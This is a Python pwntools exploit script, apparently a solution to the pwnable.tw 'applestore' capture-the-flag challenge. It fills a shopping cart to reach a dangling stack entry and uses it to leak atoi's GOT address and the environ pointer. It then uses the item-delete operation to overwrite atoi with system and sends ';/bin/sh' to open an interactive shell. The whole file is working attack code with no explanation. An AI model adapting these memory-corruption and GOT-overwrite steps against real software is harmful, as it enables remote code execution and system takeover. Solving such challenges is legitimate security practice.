from pwn import *

local=1
if local:
	p = process('./applestore')
	elf = ELF('./applestore')
	libc = ELF('/lib/i386-linux-gnu/libc.so.6')
else:
	p = remote('chall.pwnable.tw', 10104)
	elf = ELF('./applestore')
	libc = ELF('./libc_32.so.6')

def insert(n):
    p.recvuntil("> ")
    p.sendline("2")
    p.recvuntil("> ")
    p.sendline(n)
    p.recvuntil("amazing idea.\n")
def delete(n):
    p.recvuntil("> ")
    p.sendline("3")
    p.recvuntil("> ")
    p.sendline(n)
def checkout():
    p.recvuntil("> ")
    p.sendline("5")
    p.recvuntil("> ")
    p.sendline("y")
    p.recvuntil("Maybe next time!\n")
def cart(n):
    p.recvuntil("> ")
    p.sendline("4")
    p.recvuntil("> ")
    p.sendline("y\x00" + p32(n) + p32(0)*3)
    p.recvuntil("27: ")

atoi_got_addr = elf.got["atoi"]

for i in range(6):
    insert("1")
for i in range(20):
    insert("2")
checkout()

cart(atoi_got_addr)
atoi_addr = u32(p.recvuntil("\n")[:4])
print "%x"%atoi_addr
libc.address = atoi_addr - libc.symbols['atoi']
environ_bss = libc.symbols['environ']
cart(environ_bss)
environ_addr = u32(p.recvuntil("\n")[:4])
system_addr = libc.symbols['system']

ebp_addr = environ_addr - 0x100
ebp_new_addr = ebp_addr - 0xc
print "%x"%ebp_addr

p.recvuntil("> ")
p.sendline("3")
#gdb.attach(p)
p.recvuntil("> ")
p.sendline("27" + p32(atoi_got_addr) + "aaaa" + p32(atoi_got_addr + 0x22) + p32(ebp_new_addr))
p.recvuntil("> ")
p.sendline(p32(system_addr)+";/bin/sh\x00")
p.interactive()
